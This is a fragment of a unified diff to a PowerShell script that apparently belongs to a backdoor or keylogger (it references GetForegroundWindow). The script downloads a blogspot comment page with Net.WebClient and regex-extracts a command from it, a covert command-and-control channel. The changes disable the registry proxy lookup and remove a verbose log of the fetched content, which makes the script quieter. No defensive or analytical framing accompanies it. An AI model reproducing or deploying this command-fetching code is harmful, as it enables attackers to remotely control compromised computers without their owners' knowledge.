@@ -823,7 +823,7 @@ public static extern IntPtr GetForegroundWindow();
             $WebClientObject = New-Object Net.WebClient
             [string] $testo = 'http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment'
             Write-Verbose $testo
-            [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+            #[string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
             
             $proxy = new-object net.webproxy($ProxyAddress,$true)
             $proxy.UseDefaultCredentials = $True
@@ -831,7 +831,7 @@ public static extern IntPtr GetForegroundWindow();
         
             
             [string] $CommentResult = $WebClientObject.DownloadString($testo)
-            Write-Verbose $CommentResult
+           
             [string]$Commentstring = [regex]::matches( $CommentResult,  '(?i)<p[^>]*>(.*)</p>' )
             $command_g = $Commentstring.split('>')
             $command = $command_g[1]
